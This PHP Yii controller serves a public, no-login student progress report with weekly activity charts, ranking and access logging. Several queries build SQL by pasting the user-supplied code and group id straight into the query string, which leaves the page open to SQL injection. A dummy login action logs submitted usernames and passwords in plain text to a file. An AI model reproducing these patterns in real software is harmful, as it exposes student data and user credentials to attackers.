<?php

// controller for Student report (public accesible; without logging in)

namespace app\controllers;

use Yii;
use yii\web\Controller;
use yii\filters\VerbFilter;

use DateTime;

/**
 * CourseController implements the CRUD actions for Course model.
 */
class PublicController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }

    /**
     * Lists all Course models.
     * @return mixed
     */
    public function actionIndex($code = 'none', $score = 0)
    {
        if (strlen($code) < 16) exit; // invalid code in any case
        // ipcheck for testing off
        // MyHelpers::CheckIP();

        // Create report for one student(status)

        // To be changed.....
        // 'Blok' is de indeling en is korte naam uit Course, idee om korte naam op te nemen in module_def
        // Als korte naam in module_def not null neem dan die, anders de korte naam van de cursus...?
        // SELECT COALESCE(d.korte_naam, c.korte_naam) AS korte_naam => neem d.korte_naam maar indien null, neem c.korte_naam

        $sql = "SELECT r.module_id,
                    r.student_naam Student,
                    u.id student_id,
                    CASE
                        WHEN d.korte_naam IS NULL OR d.korte_naam = '' THEN c.korte_naam
                        ELSE d.korte_naam
                    END AS Blok,
                    d.naam Module,
                    r.voldaan Voldaan,
                    round( r.ingeleverd*100/r.aantal_opdrachten) 'Opdrachten %',
                    round(r.punten*100/r.punten_max) 'Punten %',
                    r.laatste_activiteit 'Laatste Actief',
                    r.ingeleverd Opdrachten,
                    r.student_nummer,
                    r.aantal_opdrachten,
                    r.punten Punten,
                    r.minpunten Minpunten,
                    u.code Code,
                    d.voldaan_rule voldaanRule,
                    u.message Message,
                    u.klas Klas,
                    d.Generiek generiek,
                    u.ranking_score Ranking,
                    r.norm_uren NormurenBehaald, 
                    d.norm_uren Normuren
                FROM resultaat r
                INNER JOIN course c on c.id = r.course_id
                INNER JOIN module_def d on d.id=r.module_id
                INNER JOIN user u on u.student_nr=r.student_nummer
                WHERE code='$code'
                and d.actief = 1
                ORDER BY d.pos;
            ";

        $sql2 = "SELECT r.module_id,
            r.student_naam Student,
            u.id student_id,
            CASE
                WHEN d.korte_naam IS NULL OR d.korte_naam = '' THEN c.korte_naam
                ELSE d.korte_naam
            END AS Blok,
            d.naam Module,
            r.voldaan Voldaan,
            round( r.ingeleverd*100/r.aantal_opdrachten) 'Opdrachten %',
            round(r.punten*100/r.punten_max) 'Punten %',
            r.laatste_activiteit 'Laatste Actief',
            r.ingeleverd Opdrachten,
            r.student_nummer,
            r.aantal_opdrachten,
            r.punten Punten,
            r.minpunten Minpunten,
            u.code Code,
            d.voldaan_rule voldaanRule,
            u.message Message,
            u.klas Klas,
            d.Generiek generiek,
            u.ranking_score Ranking,
            r.norm_uren NormurenBehaald, 
            d.norm_uren Normuren
            FROM  user u
            LEFT JOIN resultaat r on r.student_nummer = u.student_nr
            LEFT JOIN course c on c.id = r.course_id
            LEFT JOIN module_def d on d.id=r.module_id
            WHERE code='$code'
            and d.actief = 1 or d.actief is NULL
            ORDER BY d.pos;
            ";

        // Create log if invalid code is received
        $data = Yii::$app->db->createCommand($sql)->queryAll();
        if (!count($data)) {
            $sql = "INSERT INTO log (subject, message, route) VALUES ('Wrong code', '" . $code . "', '" . $_SERVER['REMOTE_ADDR'] . "');";
            Yii::$app->db->createCommand($sql)->execute();
            sleep(3);
            return $this->render('login-form');
        }

        $sql = "
            SELECT DATE_FORMAT(s.submitted_at,'%y') Jaar,
            lpad(week(s.submitted_at,1),2,0) Week,
            sum(1) 'Aantal taken',
            sum(entered_score)/10 'Score (x10)'
            FROM `submission`  s
            inner join user u on u.id = s.user_id
            and u.code='$code'
            and s.submitted_at > '1970-01-01 00:00:00'
            and datediff(curdate(),submitted_at) <= 100
            group by 1,2
        ";
        $result = Yii::$app->db->createCommand($sql)->queryAll();
        if (!$score) {
            $chart = $this->chart($result, 'Aantal taken');
        } else {
            $chart = $this->chart($result, 'Score (x10)');
        }

        $minOverLastThreeWeeks = min(array_column(array_slice($result, -4, 3), 'Aantal'), 0);

        $sql = "
        select (count(id)+1) 'rank'
            from user u1
            where u1.ranking_score>
            (select u2.ranking_score from user u2 where u2.code='$code')
        ";
        $ranking = Yii::$app->db->createCommand($sql)->queryOne();

        $sql = "
            select
            round(sum(case when (s.attempt>1) then 1 else 0 end) * 100 / sum(case when (s.attempt=1) then 1 else 0 end) ,0) 'pogingen',
            sum(1) aantal
            from submission s
            join assignment a on a.id=s.assignment_id
            join user u on u.id = s.user_id
            join assignment_group g on g.id = a.assignment_group_id
            where s.submitted_at <> '1970-01-01 00:00:00'
            and s.workflow_state='graded'
            and u.code='$code'
            and datediff(curdate(),submitted_at) <= 42
            and a.points_possible = s.entered_score
            having aantal > 16
        ";
        $result = Yii::$app->db->createCommand($sql)->queryOne();
        if ($result) {
            $pogingPercentage = $result['pogingen'];
        } else {
            $pogingPercentage = "";
        }

        $sql = "select max(timestamp) timestamp from log where subject='Import'";
        if (isset(Yii::$app->user->identity->username)) {
            $subject = "Docent";
        } else {
            $subject = "Student /public/index";
        }

        $sql .= ";INSERT INTO log (subject, message, route) VALUES ('" . $subject . "', '" . $data[0]['Student'] . "', '" . $_SERVER['REMOTE_ADDR'] . "');";
        $timestamp = Yii::$app->db->createCommand($sql)->queryOne();

        $thisCohort = explode('.', $_SERVER['SERVER_NAME'])[0];
        $currentYearLastTwoDigits = (int) substr(date("Y"), -2);
        $studentYear = $currentYearLastTwoDigits - (int) substr($thisCohort, 1);

        $predictionOutput = "";
        if ($studentYear < 2) { # if current year - curretn cohort < 2, this is the first 1.5 year, the predcition is calculated
            $prediction = new PredictionController;
            $predictionOutput = $prediction->predict($data[0]['student_id']);
        }

        return $this->render('index', [
            'data' => $data,
            'timeStamp' => $timestamp['timestamp'],
            'rank' => $ranking['rank'],
            'pogingen' => $pogingPercentage,
            'minSubmitted' => $minOverLastThreeWeeks,
            'chart' => $chart,
            'score' => $score,
            'prediction' => $predictionOutput
        ]);
    }

    public function actionDetailsModule($code, $assGroupId)
    {
        $sql = "
            SELECT u.id u_id, a.id a_id, a.course_id, u.name naam, m.naam module, a.name Opdrachtnaam, s.workflow_state 'Status',
            CASE s.submitted_at WHEN '1970-01-01 00:00:00' THEN '' ELSE s.submitted_at END 'Ingeleverd',
            s.entered_score Score,
            a.points_possible MaxScore,
            s.attempt Poging,
            CASE s.graded_at WHEN '1970-01-01 00:00:00' THEN '' ELSE s.graded_at END Beoordeeld, r.name 'Door', s.preview_url Link,
            m.voldaan_rule VoldaanRule
            FROM assignment a
            join submission s on s.assignment_id= a.id
            join user u on u.id=s.user_id
            left outer join user r on r.id=s.grader_id
            left outer join module_def m on m.id = a.assignment_group_id
            where a.assignment_group_id=$assGroupId
            and u.code='$code'
            and published=1
            order by a.position
        ";

        // $sql="
        // SELECT mi.title, mi.html_url,
        // u.id u_id, a.id a_id, a.course_id, u.name naam, md.naam module, a.name Opdrachtnaam, s.workflow_state 'Status',
        // CASE s.submitted_at WHEN '1970-01-01 00:00:00' THEN '' ELSE s.submitted_at END 'Ingeleverd',
        // s.entered_score Score,
        // a.points_possible MaxScore,
        // s.attempt Poging,
        // CASE s.graded_at WHEN '1970-01-01 00:00:00' THEN '' ELSE s.graded_at END Beoordeeld, r.name 'Door', s.preview_url Link,
        // md.voldaan_rule VoldaanRule
        // FROM module m
        // join module_items mi on mi.module_id=m.id
        // left outer join assignment a on a.id=mi.content_id
        // left outer join submission s on s.assignment_id= a.id
        // left join user u on u.id=s.user_id
        // left outer join user r on r.id=s.grader_id
        // left outer join module_def md on md.id = a.assignment_group_id
        // where mi.published=1
        // and ( a.assignment_group_id is null or (a.assignment_group_id=$assGroupId and  u.code='$code'))
        // order by m.position, mi.position
        // ";

        $data = Yii::$app->db->createCommand($sql)->queryAll();

        if (!$data) {
            return $this->render('error', [
                'message' => "Oops, found an error in the database.<br/>Probably the import did not finsish correctly?",
            ]);
        }

        return $this->render('details-module', [
            'data' => $data,
        ]);
    }

    private function getIsoWeeksInYear($year)
    {
        $date = new DateTime;
        $date->setISODate($year, 53);
        return ($date->format("W") === "53" ? 53 : 52);
    }

    private function chart($data, $columnName)
    {
        $workLoadperWeek = [];

        foreach ($data as $item) { // read all weeks from query into ass. array.
            $workLoadperWeek[intval($item['Week'])] = intval($item[$columnName]);
        }

        $aantalWeken = 10;                                  // Number of weeks in graph

        $weekNumber = date("W");                            // This week number
        $weeksThisYear = $this->getIsoWeeksInYear(date("Y"));    // max. week number of this year

        $start = $weekNumber - $aantalWeken;
        if ($start < 0) { // roll over to last year
            $start += $weeksThisYear;
        }

        $chartArray = [['Week', 'norm 5/week', ['role' => 'style']]];

        for ($i = 1; $i <= $aantalWeken; $i++) { // show $i weeks
            $week = $start + $i;
            if ($week > $weeksThisYear) { // roll over to next year
                $week -= $weeksThisYear;
            }

            $barColor = '#c0d6eb';
            if (array_key_exists($week, $workLoadperWeek)) {
                if (intval($workLoadperWeek[$week]) < 4) {
                    $barColor = '#ff9e9e';
                    $barColor = '#c0d6eb';
                } elseif (intval($workLoadperWeek[$week]) > 5) {
                    $barColor = '#c4ebc0';
                }
                array_push($chartArray, [strval($week), intval($workLoadperWeek[$week]), $barColor]); // value from query
            } else {
                array_push($chartArray, [strval($week), 0, $barColor]); // no value means 0, the first loop in this function did not fill the value because thjere was no vlaue returned from query.
            }
        }

        // dd($chartArray);

        $chart = [
            'visualization' => 'ColumnChart',
            'data' => $chartArray,
            'options' => [
                'title' => 'Wekelijkse Activiteiten',
                'height' => '160',
                'width' => '600',
                'hAxis' => array('title' => 'Weeknummer'),
                'vAxis' => array('title' => $columnName, 'ticks' => [0, 5, 10, 15]),
                'legend' => array('position' => 'top'),
                'colors' => ['#82b0ff'],
            ]
        ];

        return $chart;
    }


    // Dummy Function
    public function actionLogin()
    {
        sleep(3);
        $request = Yii::$app->request;
        $logLine =  date('Y-m-d H:i:s', time()) . " " . $_SERVER['REMOTE_ADDR'] . " " . $request->post('name') . " " . $request->post('password');
        file_put_contents('mylog.log', "\r\n" . $logLine, FILE_APPEND);
        return $this->render('login-form');
    }
}
